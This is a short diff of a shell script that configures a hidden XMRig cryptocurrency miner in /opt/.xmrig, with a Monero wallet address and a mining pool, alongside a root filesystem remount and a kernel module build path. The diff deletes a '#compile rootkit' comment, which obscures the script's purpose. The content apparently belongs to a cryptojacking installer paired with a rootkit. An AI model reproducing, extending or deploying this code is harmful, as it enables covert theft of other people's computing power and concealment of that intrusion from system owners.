@@ -11,12 +11,13 @@ mount -o remount,rw /
 module_compile_dir="/home/void/bach-project/src"
 module_dir="/lib/modules/$(uname -r)/extra"
 
+
 xmrig_dir="/opt/.xmrig"
 xmrig_binary="$xmrig_dir/xmrig"
 xmrig_config="$xmrig_dir/config.json"
 wallet="44SDeq5uxCH1mEYgjm9fq8DyBDQTWeQvyLAFTJpcbaEJYHxynkxv2mP2sWD8832rESFRGodHmDBj5MHQJMqSZnRjNKhka7x"
 pool="pool.supportxmr.com:3333"
-#compile rootkit
+
 if [ ! -d "$xmrig_dir" ]; then
 	mkdir -p "$xmrig_dir"
 fi
